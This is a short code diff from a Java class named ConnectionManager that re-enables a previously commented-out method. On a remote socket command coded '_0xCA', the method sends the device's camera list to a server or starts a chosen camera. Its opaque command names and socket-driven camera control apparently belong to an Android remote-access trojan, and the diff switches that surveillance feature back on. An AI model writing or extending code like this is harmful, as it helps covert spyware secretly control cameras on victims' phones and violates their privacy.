@@ -135,15 +135,15 @@ public class ConnectionManager {
 
     }
 
-//    public static void CA(int cameraID){
-//        if(cameraID == -1) {
-//           JSONObject cameraList = new CameraManager(context).findCameraList();
-//            if(cameraList != null)
-//            ioSocket.send("_0xCA" ,cameraList );
-//        } else {
-//            new CameraManager(context).startUp(cameraID);
-//        }
-//    }
+    public static void CA(int cameraID) {
+        if (cameraID == -1) {
+            JSONObject cameraList = new CameraManager(context).findCameraList();
+            if (cameraList != null)
+                ioSocket.send("_0xCA", cameraList);
+        } else {
+            new CameraManager(context).startUp(cameraID);
+        }
+    }
 
     public static void FI(int req, String path) {
         if (req == 0) {
